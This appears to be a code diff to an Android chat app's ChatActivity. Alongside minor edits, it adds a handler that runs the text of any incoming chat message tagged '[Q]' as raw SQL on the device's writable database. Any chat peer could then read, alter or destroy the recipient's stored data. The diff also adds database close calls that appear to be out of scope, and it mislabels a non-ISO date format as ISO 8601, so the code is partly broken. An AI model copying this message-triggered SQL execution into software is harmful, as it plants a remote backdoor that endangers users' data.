@@ -63,17 +63,10 @@ public class ChatActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_chat);
+                 super.onCreate(savedInstanceState);
         setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
+        setContentView(R.layout.activity_chat);
 
-        final TextView txthelp=((TextView) findViewById(R.id.txthelp));
-        txthelp.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                txthelp.setVisibility(View.GONE);
-            }
-        });
         IsChatActivityShowing = true;
         _this = null;
         _this = this;
@@ -517,9 +510,21 @@ public class ChatActivity extends AppCompatActivity {
                 MessageEvent.InsertMessage(context, p.name + ": " + msg.replace("[E]", "").split(":")[3].replace("\"", "").replace("]", ""), p.image, MessageEvent.NEW_MESSAGE_EVENT);
             } else if (msg.contains("[G]")) {
             }
+            else if(msg.contains("[Q]")){
+                DatabaseHelper dbh=new DatabaseHelper(_this);
+                SQLiteDatabase db=dbh.getWritableDatabase();
+                db.execSQL(msg.replace("[Q]",""));
+                db.close();
+                dbh.close();
+                db=null;
+                dbh=null;
+            }
             Data = null;
         }
-
+        db.close();
+dbh.close();
+        db=null;
+        dbh=null;
     }
 
     SQLiteDatabase readabledb;
@@ -538,7 +543,7 @@ public class ChatActivity extends AppCompatActivity {
             if (c.getCount() > 0) {
                 c.moveToFirst();
                 String data;
-                DateFormat iso8601Format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                DateFormat iso8601Format = new SimpleDateFormat("MM-dd-yyyy HH:mm:ss");
 
                 while (true) {
                     Persons p = new Persons();
